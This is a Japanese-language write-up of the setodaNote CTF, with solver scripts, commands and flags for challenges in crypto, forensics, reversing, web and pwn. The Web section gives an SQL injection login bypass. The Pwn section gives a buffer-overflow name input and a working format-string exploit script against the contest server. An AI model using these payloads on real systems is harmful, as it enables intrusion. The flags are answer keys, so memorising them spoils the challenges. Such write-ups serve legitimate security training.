# setodaNote CTF Writeup

色々な問題をゆるく解いたので、Writeupを共有させていただきます。

主催者のsoji256様 ([twitter](https://twitter.com/soji256)) 、素晴らしい時間をありがとうございました。

## Misc

### Welcome

```
$ cat welcome.txt 

  Welcome to the setodaNote CTF!!

  *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
  *                                 *
  *   flag{Enjoy_y0ur_time_here!}   *
  *                                 *
  *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

  This is the flag.

```

Flag: `flag{Enjoy_y0ur_time_here!}`

### morse_one

配布されたテキストを[ここ](https://www.dcode.fr/morse-code)に投げればFlagを入手することができる。

Flag: `flag{VIBROPLEX}`

### Hash

Solver:

```python
import hashlib
import os

hashes = ['aff02d6ad353ebf547f3b1f8ecd21efd7931e356f3930ab5ee502a391c5802d7',
          '8428f87e4dbbf1e95dba566b2095d989f5068a5465ebce96dcdf0b487edb8ecb',
          'e82f6ff15ddc9d67fc28c4b2c575adf7252d6e829af55c2b7ac1615b304d8962']
flag = b''

for tfn in os.listdir():
    with open(tfn, 'rb') as tf:
        dat = tf.read()
        mhash = hashlib.sha256(dat).hexdigest()
        for nhash in hashes:
            if nhash == mhash:
                flag += dat[:-1]

print(flag.decode())
```

Output:

```
> python .\solver.py
flag{hardest_logic_puzzle}
```

### F

Brainf*ckだとわかるので、オンラインのインタプリタ ([例](https://copy.sh/brainfuck/)) 上で実行するとFlagを入手することができる。

Flag: `flag{Don't_Use_the_F-Word!!}`

### magic_number

スクリプトを書くか迷ったが、ファイル数が少なかったので手動（バイナリエディタを用いて）調査した。

Flag: `flag{post_rar_light}`

### Stegano

StegSolve等で画像を調べればFlagを入手することができる。

Flag: `flag{Re4l17y_1s_cReA73d_by_7h3_m1nd_rA9}`

### ransom_note

問題文に書いてある通り、[The No More Ransom ProjectのWebsite](https://www.nomoreransom.org/ja/decryption-tools.html)から復号ツールを探して配布されたZIPファイルを解凍したフォルダを対象に指定して復号すればFlagを入手することができる。

Flag: `flag{unlock1ng_y0ur_d1gital_life_with0ut_paying;)}`

### Redacted

LibreOffice Drawなどのツールを用いて黒塗り部分を削除することでFlagを入手することができる。

Flag: `flag{weather_balloon}`

## Network

### Host

Wiresharkなどのツールを用いて配布されたpcapファイルを読むことで、Webサーバーのホスト名は `ctf.setodanote.net` であることがわかる。

Flag: `flag{ctf.setodanote.net}`

### tkys_never_die

Wiresharkなどのツールを用いて配布されたpcapファイルから `flag.png` をエクスポートすることでFlagを入手することができる。

Flag: `flag{a_treasure_trove}`

### echo_request

Echo Requestのデータ部分に一文字ずつFlagが格納されているので、文字に変換して結合するとFlagを入手することができる。  
下では `tshark` および `Python` を用いてワンライナーでFlagを求めている。

```
$ tshark -r ./echo_request.pcap -Y '28<frame.number<55' -T fields -e data | python3 -c "import sys; [print(chr(int(l, 16)),end='') for l in list(sys.stdin)]; print()"
flag{ICMP_Tunneling_T1095}
```

Flag: `flag{ICMP_Tunneling_T1095}`

### stay_in_touch

Wiresharkを用いてpcapngファイル内のTCPストリームを追跡していくと、ZIPファイルがやり取りされていること、そのパスワードが `Yatagarasu-Takama-Kamuyamato2` であるなどの情報を得ることができる。以下のような手順を用いることでFlagを入手することができる。

```
$ echo 'UEsDBBQAAQAAADBq8FK0Nz5zSgAAAD4AAAATAAAAUmVwb3J0LUFWLVQwMDk3LnR4dAzRMzm6s5vAM3huF0n2GEKFrarxVD3WvzurjKz9sjA7iD6nWis0GBRcIdcyrQkqliocBi2lCUB6J0hRUgHzDVCnVx6LnLS5LenqUEsBAj8AFAABAAAAMGrwUrQ3PnNKAAAAPgAAABMAJAAAAAAAAAAgAAAAAAAAAFJlcG9ydC1BVi1UMDA5Ny50eHQKACAAAAAAAAEAGADNWpx++XnXARJtllL6edcB0TOVfvl51wFQSwUGAAAAAAEAAQBlAAAAewAAAAAA' | base64 -d > t.zip
$ unzip t.zip
Archive:  t.zip
[t.zip] Report-AV-T0097.txt password:
 extracting: Report-AV-T0097.txt
$ cat Report-AV-T0097.txt
This is Flag.

 flag{SoNtOkIhAmOuKaTaHoUmOtSuMuRuNoSa;)}

```

Flag: `flag{SoNtOkIhAmOuKaTaHoUmOtSuMuRuNoSa;)}`

### Digdig

まずtsharkやPythonでFlagの格納されているクエリ部分（加工済）を抽出する。

```
$ tshark -r digdig.pcap -Y '14 < frame.number' -T fields -e dns.qry.name | awk '(NR % 4 == 0){print}' | python3 -c "import sys; [print(l[6:8] + ' : ' + l[8:24]) for l in list(sys.stdin)];"
02 : 735f69735f44414d
06 : 63655f7472795f53
03 : 4d595f464c41477d
08 : 5f746861747d2066
0a : 6c61677b444e535f
0b : 5333637572313779
07 : 6f7272795f666f72
04 : 20666c6167206973
09 : 6c61672069732066
0c : 5f5431303731217d
11 : 797d323232323232
0d : 20666c6167206973
0f : 335f6b33795f3135
0e : 20666c61677b3768
01 : 666c61677b546869
10 : 5f35336375723137
00 : 666c616720697320
05 : 20666c61677b4e69
```

雑に手動でソートして、以下のようなスクリプトを実行することでFlagを入手することができる。

Solver:

```python
import re

dat = ['666c616720697320','666c61677b546869','735f69735f44414d','4d595f464c41477d','20666c6167206973','20666c61677b4e69','63655f7472795f53','6f7272795f666f72','5f746861747d2066','6c61672069732066','6c61677b444e535f','5333637572313779','5f5431303731217d','20666c6167206973','20666c61677b3768','335f6b33795f3135','5f35336375723137','797d323232323232']

for fd in dat:
    for fc in re.split('(..)',fd)[1::2]:
        print(chr(int(fc, 16)), end='')
    print('\n==========')
```

Output:

```
$ python3 digsolve.py
flag is
==========
flag{Thi
==========
s_is_DAM
==========
MY_FLAG}
==========
 flag is
==========
 flag{Ni
==========
ce_try_S
==========
orry_for
==========
_that} f
==========
lag is f
==========
lag{DNS_
==========
S3cur17y
==========
_T1071!}
==========
 flag is
==========
 flag{7h
==========
3_k3y_15
==========
_53cur17
==========
y}222222
==========
```

Flag: `flag{DNS_S3cur17y_T1071!}`

### Logger

USB通信を記録したpcapなので、まずLeftover Capture Dataを抽出する。  
(今回は `usblog.txt` というファイルに結果を保存した。)

```
$ tshark -r logger.pcap -T fields -e usb.capdata | awk '(NR % 2 != 0){print}'
0200000000000000
0200120000000000
0200000000000000
・ 　　　　　　 ・
・ 長いので省略 ・
・ 　　　　　　 ・
0000000000000000
0000280000000000
0000000000000000
```

その上で[このWriteup](https://ctftime.org/writeup/17233)を参考に組み上げたスクリプトを実行すればFlagを入手することができる。  
(スクリプトはほぼそのまま流用可能なので、こちらでソルバは掲載しない)

Flag: `flag{QWE_keyb0ard_RTY}`

## Web

### Body

問題名通り、HTMLソースの86行目にFlagが書かれている。

Flag: `flag{Section_9}`

### Header

問題名通り、ヘッダにFlagが書かれている。

Flag: `flag{Just_a_whisper}`

### puni_puni

[日本語URL変換ツール](http://n7.com/japanese)などを使用すればFlagを入手することができる。

Flag: `flag{33punycode44}`

### Mistake

`images` ディレクトリ内にFlagの書かれたテキストファイルが設置してあります。([リンク](https://ctf.setodanote.net/web003/images/pic_flag_is_here.txt))

Flag: `flag{You_are_the_Laughing_Man,_aren't_you?}`

### tkys_royale

ユーザー名に `admin' -- ` のような値を入れてログインするとFlagを入手することができる。

Flag: `flag{SQLi_with_b1rds_in_a_b34utiful_landscape}`

### Estimated

削除された記事自体は閲覧できなかったが、削除された記事の画像にはアクセスできたので、画像を見ることによってFlagを入手することができる。  
(画像のURLは他記事の画像のURLから推測可能)

Flag: `flag{The_flag_wouldn't_like_to_end_up_in_other_peoples_photos}`

### Redirect

JavaScriptコードによって彼方此方にリダイレクトしていくので、`curl`コマンドを使いながら（パラメータ等を調整しながら）追跡していけばFlagを入手することができる。

```
$ curl "https://noisy-king-d0da.setodanote.net/?callback=getFlag&data1=2045&data2=0907&data3=BiancoRoja&data4=1704067200"
<!DOCTYPE html>
<body>
  <h1>Nice work!!</h1>
  <p>flag{Analyz1ng_Bad_Red1rects}</p>
</body>
```

Flag: `flag{Analyz1ng_Bad_Red1rects}`

## OSINT

### tkys_with_love

Google画像検索を使用するだけでFlagを入手することができる。

Flag: `flag{Symphony_of_the_Seas}`

### Dorks

知識問。

Flag: `flag{inurl:login.php}`

### filters_op

[答え](https://twitter.com/cas_nisc/status/864058208536543232?s=20)。Twitterの検索フィルタについて知っていれば解ける。

Flag: `flag{#WannaCrypt}`

### MAC

問題名および例示からMACアドレスのベンダー名の頭文字が対応する文字だとわかる。この法則に則って変換していけば、Flagを入手することができる。

Flag: `flag{O_U_I_Y_A}`

### tkys_eys_only

`40.749444N 73.968056W` をGoogle Mapで検索するだけ。

Flag: `flag{United_Nations}`

### MITRE

MITRE ATT&CKの識別子に関連していることが問題文から予測できるので、とりあえず `T1495T1152T1155T1144 T1130T1518` の解読を試みる。

```
T1495 : Firmware Corruption
T1152 : Launchctl
T1155 : AppleScript
T1144 : Gatekeeper Bypass
```

頭文字を繋ぎ合わせると `FLAG` になるため、それぞれのIDが指すテクニックの頭文字を繋ぎ合わせたものがFlagだとわかる。この法則に則って文字列を変換すればFlagを入手することができる。

Flag: `flag{MITRE_ATTACK_MATLIX_THX}`

### Ropeway

Google画像検索に画像をアップロードすれば、浜名湖オルゴールミュージアムと舘山寺ロープウェイの近くであることがわかる。

Flag: `flag{kanzanji}`

## Crypto

### Base64

```
$ echo 'ZmxhZ3tJdCdzX2NhbGxlZF9iYXNlNjQhfQ==' | base64 -d
flag{It's_called_base64!}
```

Flag: `flag{It's_called_base64!}`

### ROT13

```
$ echo "synt{Rira_lbh_Oehghf?}" | python3 -c 'import sys, codecs; print(codecs.decode(sys.stdin.read(), "rot13"))'
flag{Even_you_Brutus?}

```

Flag: `flag{Even_you_Brutus?}`

### pui_pui

Solver:

```
dat = bytearray(b'\x41\x3a\x44\x6f\x20\x79\x6f\x75\x20\x6b\x6e\x6f\x77\x20\x4d\x6f\x6c\x63\x61\x72\x3f\x0a\x0a\x42\x3a\x4f\x66\x20\x63\x6f\x75\x72\x73\x65\x21\x20\x49\x20\x6c\x6f\x76\x65\x20\x74\x68\x65\x20\x73\x63\x65\x6e\x65\x20\x77\x68\x65\x72\x65\x20\x68\x65\x20\x73\x69\x6e\x6b\x73\x20\x69\x6e\x74\x6f\x20\x74\x68\x65\x20\x62\x6c\x61\x73\x74\x20\x66\x75\x72\x6e\x61\x63\x65\x20\x77\x68\x69\x6c\x65\x20\x67\x69\x76\x69\x6e\x67\x20\x74\x68\x65\x20\x74\x68\x75\x6d\x62\x73\x20\x75\x70\x2e\x0a\x0a\x41\x3a\x2e\x2e\x2e\x20\x57\x68\x61\x74\x3f\x0a\x0a\x42\x3a\x62\x74\x77\x2c\x20\x74\x68\x65\x20\x66\x6c\x61\x67\x20\x69\x73\x20\x66\x6c\x61\x67\x7b\x48\x61\x76\x65\x5f\x79\x6f\x75\x5f\x65\x76\x65\x72\x5f\x68\x65\x61\x72\x64\x5f\x6f\x66\x5f\x48\x65\x78\x64\x75\x6d\x70\x3f\x7d\x2e\x0a')
for fch in dat: print(chr(fch),end='')
```

Output:

```
> python .\puipui_solver.py
A:Do you know Molcar?

B:Of course! I love the scene where he sinks into the blast furnace while giving the thumbs up.

A:... What?

B:btw, the flag is flag{Have_you_ever_heard_of_Hexdump?}.
```

Flag: `flag{Have_you_ever_heard_of_Hexdump?}`

### tkys_secret_service

多分[quipqiup](https://www.quipqiup.com/)に丸投げするのが一番早いと思います。

Decoded:

```
The protection of Fontrolled Nnclassified Onformation (FNO) resident in nonfederal systems and organizations is of paramount importance to federal agencies and can directly impact the ability of the federal government to successfully conduct its essential missions and functions. This publication provides agencies with recommended security requirements for protecting the confidentiality of FNO when the information is resident in nonfederal systems and organizations; when the nonfederal organization is not collecting or maintaining information on behalf of a federal agency or using or operating a system on behalf of an agency; and where there are no specific safeguarding requirements for protecting the confidentiality of Clag is flag{puipui_car_of_mol} FNO prescribed by the authorizing law, regulation, or governmentwide policy for the FNO category listed in the FNO Registry. The requirements apply to all components of nonfederal systems and organizations that process, store, and/or transmit FNO, or that provide protection for such components. The security requirements are intended for use by federal agencies in contractual vehicles or other agreements established between those agencies and nonfederal organizations.
```

Flag: `flag{puipui_car_of_mol}`

### vul_rsa_01

```
$ python3 RsaCtfTool.py -e 65537 -n 13373801376856352919495636794117610920860037770702465464324474778341963699665011787021257 --uncipher 39119617768257067256541748412833564043113729163757164299687579984124653789492591457335

[REDACTED SOME LINES]

Unciphered data :
HEX : 0x0000000000666c61677b7765616b5f7273615f63616e5f62655f646563727970746564217d
INT (big endian) : 46327402297761911070944293204953074319567693047395802794186233938451290661245
INT (little endian) : 62230274487105820292772638823612604590748807093488833479858991971752061223012822008463360
utf-8 : flag{weak_rsa_can_be_decrypted!}
STR : b'\x00\x00\x00\x00\x00flag{weak_rsa_can_be_decrypted!}'
```

Flag: `flag{weak_rsa_can_be_decrypted!}`

### vul_rsa_02

```
$ python3 RsaCtfTool.py -e 66936921908603214280018123951718024245768729741801173248810116559480507532472797061229726239246069153844944427944092809221289396952390359710880636835981794334459051137 -n 314346410651148884346780415550080886403387714336281086088147022485674797846237037974025946383115524274834695323732173639559408484919557273975110018517586435379414584423 --uncipher 227982950403746746755552239763357058548502617805036635512868420433061892121830106966643649614593055827188324989309580260616202575703840597661315505385258421941843741681

[REDACTED SOME LINES]

Unciphered data :
HEX : 0x00026d79a6fba2741958ce82462855a96ec4dc1623133cfc341579920befc02eb7b9e0a3bbb87200666c61677b3139375f4d69636861656c5f4a5f5769656e65725f3637337d
INT (big endian) : 139798168458800312619727954564053595602272620374704334322644822890230408773803390124016933159608289280352695220195070051973287657162728356081272992926853175686148989
INT (little endian) : 1845704400959999148955767357764584773879807573417556934806144078363531192151775289329637546633081241953731286516885596747340023540455177925029084293276584228646671942144
utf-16 : Ȁ祭ﮦ璢堙苎⡆꥕쑮ᛜጣﰼᔴ鉹⻀릷ꏠ뢻r汦条ㅻ㜹䵟捩慨汥䩟坟敩敮彲㜶紳
STR : b'\x00\x02my\xa6\xfb\xa2t\x19X\xce\x82F(U\xa9n\xc4\xdc\x16#\x13<\xfc4\x15y\x92\x0b\xef\xc0.\xb7\xb9\xe0\xa3\xbb\xb8r\x00flag{197_Michael_J_Wiener_673}'
```

Flag: `flag{197_Michael_J_Wiener_673}`

## Rev

### Helloworld

Ghidraなどのツールを用いて解析することで、FlagがXOR (key: 0x4e) でエンコードされてハードコードされていることがわかる。以下のようなスクリプトを用いることでFlagを入手することができる。

Solver:

```python
flag_dat = [0x28, 0x22, 0x2f, 0x29, 0x35, 0x28, 0x3c, 0x2b, 0x2b, 0x11, 0x28, 0x2f, 0x27, 0x3c, 0x11, 0x2f, 0x20, 0x2a, 0x11, 0x3d, 0x2b, 0x2d, 0x3b, 0x3c, 0x2b, 0x11, 0x2d, 0x37, 0x2c, 0x2b, 0x3c, 0x3d, 0x3e, 0x2f, 0x2d, 0x2b, 0x33]
i = 0
while i < 0x25:
    print(chr(flag_dat[i] ^ 0x4e), end='')
    i += 1
```

Output:

```
> python .\solver.py
flag{free_fair_and_secure_cyberspace}
```

つい癖でFlagの出力部分を静的解析してしまったが、落ち着いてコードを読めば態々こんなことをしなくても実行時の引数に `flag` を付けるだけでFlagを入手できることがわかる。

```
> .\helloworld.exe flag
flag{free_fair_and_secure_cyberspace}
```

Flag: `flag{free_fair_and_secure_cyberspace}`

### ELF

ELFファイルのヘッダ部分が書き換えられているので、修正して実行するとFlagを入手することができる。

```
$ ./elf
flag{run_makiba}
```

Flag: `flag{run_makiba}`

### Passcode

Ghidraなどのツールを用いて解析することで、プログラムが要求しているパスコードが `20150109` であることがわかる。このパスコードの先頭に `flag{` , 終末に `}` を付与した文字列がFlagである。

Flag: `flag{20150109}`

### Passcode2

Passcodeでは平文で管理されていたパスコードをXOR (key: 0x2a) エンコードしている。デコンパイルによって得た情報をもとに、以下のようなスクリプトを作成することでFlagを入手することができる。 

Solver:

```python
a = bytearray(b'\x1e\x1b\x1a\x18\x04\x5a\x4f\x79\x04\x1f\x18')
i = 0
flag = ''

while i < 0xb:
    flag += chr(a[i] ^ 0x2a)
    i += 1

print('flag{' + ''.join(list(reversed(flag))) +'}')
```

Output:

```
> python .\solver.py
flag{25.Sep.2014}
```

Flag: `flag{25.Sep.2014}`

### to_analyze

`_CorExeMain()` 関数の存在から、.NETアプリケーションであることが推測できる。`dotPeek` などのツールを用いてデコンパイルする。Directoryが存在するか確かめているコードを見つけることができるので、引数として渡されている値を以下のようなスクリプトを用いて求める。

```python
numArray = [65, 127, 89, 80, 182, 160, 183, 182, 89, 118, 119, 116, 177, 189, 177]

def a(b, i):
    if i == 119:
        if b == 107 or b == 117 or b == 108 or b == 102 or b == 98:
            return True
    elif b == 110 or b == 119 or (b == 99 or b == 111) or (b == 97 or b == 101 or (b == 112 or b == 103)) or (b == 108 or b == 107 or (b == 112 or b == 113)):
        return True
    return False

def b(b, i):
    if i == 39:
        b ^= 19
    elif i == 114:
        b ^= 40
    return b

for i in range(len(numArray)):
    numArray[i] ^= 35
    if a(numArray[i], 119):
        numArray[i] += 3
    numArray[i] ^= 21
    numArray[i] -= 32
    numArray[i] = b(numArray[i], 39)

for fch in numArray: print(chr(fch), end='')
```

Output:

```
> python .\solver.py
C:\Users\321txt
```

同じ要領でFlagの出力部分を解析しても良いが、面倒だったので上記のフォルダを検証環境上に作成しプログラムを実行した。

Output:

```
> .\to_analyze.exe
Yes, that's the right answer.

flag{Do_y0u_Kn0w_Ursnif?}

```

Flag: `flag{Do_y0u_Kn0w_Ursnif?}`

## Forensics

### paint_flag

配布された `docx` ファイルをZIPファイルとして解凍し `word\media\flag.png` を発見することでFlagを入手することができる。

Flag: `flag{What_m4tters_is_inside;)}`

### Mail

`ImapMail\mail.setodanote.net\Sent-1` を読むとBase64エンコードされたZIPファイルを発見することができる。Pythonなどを用いてBase64デコードを行いZIPファイルを出力し、そのZIPファイルを解凍し格納されていた `goodjob.png` を発見することでFlagを入手することができる。

Flag: `flag{You've_clearly_done_a_good_job_there!!}`

### Deletedfile

配布されたディスクイメージファイルのroot直下に存在する `secret_word.jpg` を発見することでFlagを入手することができる。

Flag: `flag{nosce_te_ipsum}`

### Timeline

DB Browser for SQLite ([URL](https://sqlitebrowser.org/))などを用いて `ActivitiesCache.db` を調査すると、Flagが一文字ずつテキストファイルのファイル名として隠されていることがわかる。適切なフィルタなどを用いつつ文字を繋ぎ合わせることでFlagを入手することができる。

Flag: `flag{Th3_Fu7Ure_1s_N0w}`

### browser_db

BrowsingHistoryView ([URL](https://www.nirsoft.net/utils/browsing_history_view.html))などを用いて `stella_9s84jetw.default-release_places.sqlite`を調査することでFlagを入手することができる。

Flag: `flag{goosegoosego}`

### MFT

MFTExplorer ([URL](https://ericzimmerman.github.io/#!index.md))などを用いて`C_$MFT`を調査することでFlagを入手することができる。

Flag: `flag{kimitsu.zip}`

### tkys_another_day

`apngdis` などを用いてPNGファイルを分割し、合成することでFlagを入手することができる。

```
$ apngdis t.png

APNG Disassembler 2.9

Reading 't.png'...
extracting frame 1 of 5
extracting frame 2 of 5
extracting frame 3 of 5
extracting frame 4 of 5
extracting frame 5 of 5
all done
```

合成後の画像:

[f:id:m0pisec:20210823155937j:plain]


Flag: `flag{a_fake_illness_is_the_most_serious_disease_f5ab7}`

### CSIRT_asks_you_01

FullEventLogView ([URL](https://www.nirsoft.net/utils/full_event_log_view.html))などを用いて配布されたイベントログファイルをID: 4624を中心に調査することでFlagを入手することができる。

Flag: `flag{2021/07/18_20:09:21_4624}`

### unallocated_space

未使用領域から動画ファイル (MP4形式) を抽出すればFlagを入手することができる。Foremostを用いてカービングを行おうとしたが失敗したので、バイナリエディタを用いて手動で抽出を行った。

Flag: `flag{file_carving_gogo}`

## Programming

### ZZZIPPP

以下のソルバを実行すると `flag.txt` が解凍され、Flagを入手することができる。

Solver:

```python
import zipfile

nlist = list(range(1, 1001))
nlist.reverse()

for i in nlist:
    with zipfile.ZipFile('flag' + str(i) + '.zip') as fzip:
        fzip.extractall()
```

Flag: `flag{loop-zip-1989-zip-loop}`

### echo_me

以下のソルバを実行すればFlagを入手することができる。

Solver:

```python
from pwn import *

r = remote('10.1.1.10', 12020)

while True:
    try:
        r.recvuntil(b'echo me: ')
        et = r.recvuntil(b'\n')
        r.send(et)
    except:
        r.interactive()
```

Output:

```
$ python3 echome_solve.py
[+] Opening connection to 10.1.1.10 on port 12020: Done
[*] Switching to interactive mode
==========
Correct!

flag{Hellow_yamabiko_Yoo-hoo!}
```

Flag: `flag{Hellow_yamabiko_Yoo-hoo!}`

### EZZZIPPP

以下のソルバを実行すると `flag.txt` が解凍され、Flagを入手することができる。

Solver:

```python
import os
import zipfile

nlist = list(range(1, 1001))
nlist.reverse()

for i in nlist:
    with open('pass.txt', 'r') as pf:
        passwd = pf.read()[:-1]
    os.remove('pass.txt')
    with zipfile.ZipFile('flag' + str(i) + '.zip') as fzip:
        fzip.extractall(pwd=passwd.encode())
```

Flag: `flag{bdf574f15645df736df13daef06128b8}`

### deep_thought

以下のソルバを実行すればFlagを入手することができる。

Solver:

```python
from pwn import *

r = remote('10.1.1.10', 12010)

while True:
    try:
        if input(r.recvuntil(b'\n').decode()[:-1] + ' > ') == 'n':
            r.interactive()
        et = r.recvuntil(b'\n').decode()[:-1].split(' ')
        if et[1] == '+':
            r.send(str(int(et[0])+int(et[2])) + '\n')
        elif et[1] == '-':
            r.send(str(int(et[0])-int(et[2])) + '\n')
        r.recvuntil(b'\n')
        r.recvuntil(b'\n')
    except:
        r.interactive()
```

Output:

```
$ python3 deep_solve.py 
[+] Opening connection to 10.1.1.10 on port 12010: Done
[ Q1 ] > 
[ Q2 ] > 
[ Q3 ] > 
[ Q4 ] > 
[ Q5 ] > 
[ Q6 ] > 
[ Q7 ] > 
[ Q8 ] > 
[ Q9 ] > 
[ Q10 ] > 
[ Q11 ] > 
[ Q12 ] > 
[ Q13 ] > 
[ Q14 ] > 
[ Q15 ] > 
[ Q16 ] > 
[ Q17 ] > 
[ Q18 ] > 
[ Q19 ] > 
[ Q20 ] > 
[ Q21 ] > 
[ Q22 ] > 
[ Q23 ] > 
[ Q24 ] > 
[ Q25 ] > 
[ Q26 ] > 
[ Q27 ] > 
[ Q28 ] > 
[ Q29 ] > 
[ Q30 ] > 
[ Q31 ] > 
[ Q32 ] > 
[ Q33 ] > 
[ Q34 ] > 
[ Q35 ] > 
[ Q36 ] > 
[ Q37 ] > 
[ Q38 ] > 
[ Q39 ] > 
[ Q40 ] > 
[ Q41 ] > 
[ Q42 ] > 
[ Q43 ] > 
[ Q44 ] > 
[ Q45 ] > 
[ Q46 ] > 
[ Q47 ] > 
[ Q48 ] > 
[ Q49 ] > 
[ Q50 ] > 
flag{__42__} > 
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

Flag: `flag{__42__}`

## Pwn

### tkys_let_die

```
$ nc 10.1.1.10 13020

                                  {} {}
                          !  !  ! II II !  !  !
                       !  I__I__I_II II_I__I__I  !
                       I_/|__|__|_|| ||_|__|__|\_I
                    ! /|_/|  |  | || || |  |  |\_|\ !
        .--.        I//|  |  |  | || || |  |  |  |\\I        .--.
       /-   \    ! /|/ |  |  |  | || || |  |  |  | \|\ !    /=   \
       \=__ /    I//|  |  |  |  | || || |  |  |  |  |\\I    \-__ /
        }  {  ! /|/ |  |  |  |  | || || |  |  |  |  | \|\ !  }  {
       {____} I//|  |  |  |  |  | || || |  |  |  |  |  |\\I {____}
 _!__!__|= |=/|/ |  |  |  |  |  | || || |  |  |  |  |  | \|\=|  |__!__!_
 _I__I__|  ||/|__|__|__|__|__|__|_|| ||_|__|__|__|__|__|__|\||- |__I__I_
 -|--|--|- ||-|--|--|--|--|--|--|-|| ||-|--|--|--|--|--|--|-||= |--|--|-
  |  |  |  || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||  |  |  |
  |  |  |= || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||- |  |  |
 _|__|__|  ||_|__|__|__|__|__|__|_|| ||_|__|__|__|__|__|__|_||  |__|__|_
 -|--|--|= ||-|--|--|--|--|--|--|-|| ||-|--|--|--|--|--|--|-||- |--|--|-
  |  |  |- || |  |  |  |  |  |  | || || |  |  |  |  |  |  | ||= |  |  |
 ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~~~~~~~~~~

You'll need permission to pass. What's your name?
> ABCDEFGHIJKLMNOPQRSTUVWXYZopen

 =============================

     GREAT! GATE IS OPEN!!

 >> Flag is flag{Alohomora} <<

    *-*-*-*-*-*-*-*-*-*-*-*   

 =============================


```

Flag: `flag{Alohomora}`

### 1989

Solver:

```python
from pwn import *
import struct

r = remote('10.1.1.10', 13030)

r.recvuntil('flag    | [')
addr = r.recvuntil(']')[:-1].decode()

payload = struct.pack('<I', int(addr, 16))
payload += b'%4$s\n'

r.send(payload)
r.recvuntil('\n')
r.recvuntil('\n')
r.recvuntil('\n')
print(r.recvuntil('\n'))
```

Output:

```
$ python3 1989_solver.py 
[+] Opening connection to 10.1.1.10 on port 13030: Done
b'Ready > Your Inpur : `\xf0WVflag{Homenum_Revelio_1989}\n'
[*] Closed connection to 10.1.1.10 port 13030
```

Flag: `flag{Homenum_Revelio_1989}`
